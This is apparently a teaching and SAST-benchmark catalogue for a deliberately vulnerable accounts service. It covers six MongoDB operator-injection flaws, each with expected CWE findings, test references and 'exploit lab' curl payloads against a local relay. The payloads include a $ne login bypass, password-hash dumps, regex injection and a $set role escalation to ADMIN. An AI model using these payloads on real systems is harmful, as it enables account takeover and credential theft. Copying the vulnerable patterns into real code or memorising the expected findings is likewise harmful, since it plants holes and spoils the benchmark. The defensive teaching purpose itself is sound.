# `MONGO` — NoSQL operator injection

Six weaknesses of the legacy console and importer paths in `accounts`, all of them a caller's structure forwarded to the store instead of a filter built field by field. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

## MONGO-001 — the request body is the query filter

### MONGO-001 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/sessions` |
| Sink | The parsed request body used as the find filter, in `apps/accounts/src/legacy/legacy-sessions.controller.ts` |
| Flow | `{"email":{"$ne":null},"password":{"$ne":null}}` → the filter matches the first account → a session is issued for it |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`signIn`: scalar string arguments, the filter built field by field), `apps/accounts/src/auth/auth.controller.ts` (`typed`: the DTO refuses a non-string) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-943, SAST |

### MONGO-001 — student guide

A sign-in that puts the caller's JSON into `find` asks MongoDB "which account has an email that is not null and a password that is not null" — every account. The first match signs in, and it is the administrator.

### MONGO-001 — exploit lab

```console
$ curl -s $RELAY/internal/sessions -H 'content-type: application/json' \
    -d '{"email":{"$ne":null},"password":{"$ne":null}}' | jq '{user: .user.id, role: .user.role}'
{"user":"u-admin","role":"ADMIN"}
```

Signed in as the administrator, with no password at all. The same body to the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/sessions/typed \
    -H 'content-type: application/json' -d '{"email":{"$ne":null},"password":{"$ne":null}}'
400
```

And `signIn` with the same values as variables: `BAD_USER_INPUT` — the arguments are strings, and an object is not one.

### MONGO-001 — vulnerable and protected

| | Why |
| --- | --- |
| `POST /internal/sessions` (vulnerable) | The body is the filter: operators and all |
| `signIn` (protected) | Scalar arguments; the filter is built field by field from two strings, so an operator never reaches the store |
| `POST /internal/sessions/typed` (protected) | The DTO declares two string fields; an object value is a 400 before any query exists |

### MONGO-001 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-001`: the operator body signs in as `u-admin`; `signIn` refuses it as `BAD_USER_INPUT`; the typed route answers 400.

## MONGO-002 — a JSON filter forwarded to `find`

### MONGO-002 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `findUsers(filter: JSON)` |
| Sink | The caller's JSON forwarded as the find filter, in `apps/accounts/src/legacy/users-lookup.resolver.ts` |
| Flow | a user's token → `filter: {"role":{"$ne":"USER"}}` → every administrator's full document, hash included |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`users(role, q)`: typed arguments), `searchUsers` (a DTO of two allowlisted fields) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-943, SAST |

### MONGO-002 — student guide

The console's flexible search took its filter from the caller. Forwarded as-is, the `$ne` operator turns "users with a role" into "users whose role is not USER" — and the projection-free answer carries the stored hashes.

### MONGO-002 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    --data-raw '{"query":"query ($f: JSON) { findUsers(filter: $f) }","variables":{"f":{"role":{"$ne":"USER"}}}}' \
  | jq '.data.findUsers[0] | {email, passwordHash}'
{"email":"admin@vcx.exchange","passwordHash":"scrypt$16384$8$1$0530fc0d…"}
```

An ordinary user's token. The same value as the enum argument of `users`: `BAD_USER_INPUT`, the value never coerces. As a field of `searchUsers`' input: `BAD_USER_INPUT` again, the DTO allowlists two fields.

### MONGO-002 — vulnerable and protected

| | Why |
| --- | --- |
| `findUsers(filter)` (vulnerable) | The JSON argument is the filter, operators included |
| `users(role, q)` (protected) | `role` is an enum and `q` a string: an object is neither, and the filter is built in the repository |
| `searchUsers(query)` (protected) | Two allowlisted fields through a validated input type |

### MONGO-002 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-002`: the operator filter answers the administrator's document with its hash; both counterparts refuse the same value.

## MONGO-003 — the bracketed query string is the filter

### MONGO-003 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/users/filter` |
| Sink | `?filter[role][$ne]=USER` parsed into an object and used as the filter, in `apps/accounts/src/legacy/users-filter.controller.ts` |
| Flow | the query string → `parseBrackets` → `{role: {$ne: 'USER'}}` → the store |
| Counterparts | `apps/accounts/src/users/users.controller.ts` (`GET /internal/users`: flat parameters; `GET /internal/users/search`: a validated DTO) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-943, SAST |

### MONGO-003 — student guide

The console's client library encoded nested objects as bracketed keys. The route parses them back into an object and queries with it, so the operator travels from the address bar to MongoDB.

### MONGO-003 — exploit lab

```console
$ curl -s "$RELAY/internal/users/filter?filter%5Brole%5D%5B%24ne%5D=USER" -H "authorization: Bearer $ADMIN" \
  | jq '.[0] | {email, passwordHash}'
{"email":"admin@vcx.exchange","passwordHash":"scrypt$16384$8$1$0530fc0d…"}
```

The same operator on the flat route:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' "$RELAY/internal/users?role%5B%24ne%5D=USER" -H "authorization: Bearer $ADMIN"
400
```

And on the search route, through its DTO: 400 as well.

### MONGO-003 — vulnerable and protected

| | Why |
| --- | --- |
| `GET /internal/users/filter` (vulnerable) | Bracketed keys become a nested object, and the object is the filter |
| `GET /internal/users` (protected) | Flat parameters with declared types; `role` is an enum, and an object never reaches the store |
| `GET /internal/users/search` (protected) | The same value meets a DTO with two allowlisted fields |

### MONGO-003 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-003`: the bracketed operator answers the administrators with hashes; both flat routes answer 400.

## MONGO-004 — text interpolated into `$regex`

### MONGO-004 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `findUsersByName(q: String!)` |
| Sink | `q` interpolated unescaped into `$regex`, in `apps/accounts/src/legacy/users-lookup.resolver.ts` |
| Flow | the text → `{displayName: {$regex: q}}` → a pattern, not a name |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`users(q)`: escaped and anchored), `searchUsers` (a text search, no regular expression) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-943, SAST |

### MONGO-004 — student guide

A name search that builds a regular expression from the query matches everything `.*` matches. Unescaped, the caller's text is the pattern.

### MONGO-004 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"query { findUsersByName(q: \".*\") { id } }"}' | jq '.data.findUsersByName | length'
6
```

Every user, for a pattern. The same text through `users`:

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ADMIN" \
    -d '{"query":"query { users(q: \".*\") { id } }"}'
{"data":{"users":[]}}
```

No user is named `.*`: the text is a literal to match. `searchUsers` answers `[]` too — in a text search, `.*` is a term like any other.

### MONGO-004 — vulnerable and protected

| | Why |
| --- | --- |
| `findUsersByName(q)` (vulnerable) | The text is the regular expression |
| `users(q)` (protected) | The text is escaped and anchored: a literal name, and nothing is named `.*` |
| `searchUsers` (protected) | A text search with no regular expression in the path |

### MONGO-004 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-004`: `".*"` returns six users through the pattern; both counterparts return none for the same text.

## MONGO-005 — the caller names the sort and the projection

### MONGO-005 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `findUsers(sortBy, fields)` |
| Sink | The caller's string as the sort and the caller's JSON as the projection, in `apps/accounts/src/legacy/users-lookup.resolver.ts` |
| Flow | `fields: {"passwordHash": 1, "_id": 0}`, `sortBy: "passwordHash"` → a store of hashes ordered by hash |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`users(orderBy)`: an enum mapped to a field), `searchUsers` (a fixed sort) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-943, SAST |

### MONGO-005 — student guide

The projection is what leaves the store. When the caller names it, the hashes are one argument away — and the sort names them an order too.

### MONGO-005 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    --data-raw '{"query":"query ($f: JSON) { findUsers(fields: $f, sortBy: \"passwordHash\") }","variables":{"f":{"passwordHash":1,"_id":0}}}' \
  | jq '.data.findUsers | length, .[0]'
6
{"passwordHash":"scrypt$16384$8$1$0530fc0d…"}
```

Six rows, one key each. The same intent through the enum: `users(orderBy: PASSWORD_HASH)` is a `GRAPHQL_VALIDATION_FAILED` — the enum has no such member. `searchUsers` sorts its results the same way whatever the caller sends.

### MONGO-005 — vulnerable and protected

| | Why |
| --- | --- |
| `findUsers(sortBy, fields)` (vulnerable) | Sort and projection are the caller's |
| `users(orderBy)` (protected) | An enum maps to a field, and the projection is the service's own `User` shape |
| `searchUsers` (protected) | A fixed sort; no caller-named projection exists |

### MONGO-005 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-005`: the caller-named projection answers six hash-only rows ordered by hash; the enum counterpart is refused by the schema; the search counterpart answers its fixed order.

## MONGO-006 — the preferences document is the `$set`

### MONGO-006 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `updatePreferencesAll(prefs: JSON!)` |
| Sink | The caller's document used as the `$set`, in `apps/accounts/src/legacy/preferences-bulk.resolver.ts` |
| Flow | `prefs: {"role":"ADMIN"}` → `updateOne({_id}, {$set: prefs})` → the caller's own role changes |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updatePreferences`: typed input; `setPreference`: an enum names the one key it writes) |
| Tests | `apps/accounts/test/scenarios/mongo.int-spec.ts` |
| Expected finding | Yes, CWE-915 / CWE-943, SAST |

### MONGO-006 — student guide

An update whose `$set` is the caller's JSON writes whatever the document carries. `role` is a field of the same document, so it is written like any preference.

### MONGO-006 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $BOB" \
    --data-raw '{"query":"mutation ($p: JSON!) { updatePreferencesAll(prefs: $p) { id role } }","variables":{"p":{"role":"ADMIN"}}}'
{"data":{"updatePreferencesAll":{"id":"u-bob","role":"ADMIN"}}}
```

Bob is an administrator now, and the same mutation said so. The same document to `updatePreferences`: `BAD_USER_INPUT` — the input declares four preference fields and `role` is not one. To `setPreference(name: ROLE, …)`: the schema refuses, `ROLE` is not a member of the enum.

### MONGO-006 — vulnerable and protected

| | Why |
| --- | --- |
| `updatePreferencesAll(prefs)` (vulnerable) | The document is the `$set`: every field it carries is written |
| `updatePreferences` (protected) | A typed input of four preference fields; an unknown field is refused, not written |
| `setPreference(name, value)` (protected) | An enum names the one key the mutation may write |

### MONGO-006 — tests

`apps/accounts/test/scenarios/mongo.int-spec.ts`, `MONGO-006`: the role write lands and the answer says `ADMIN`; both counterparts refuse the same document (then the lab reset restores Bob).
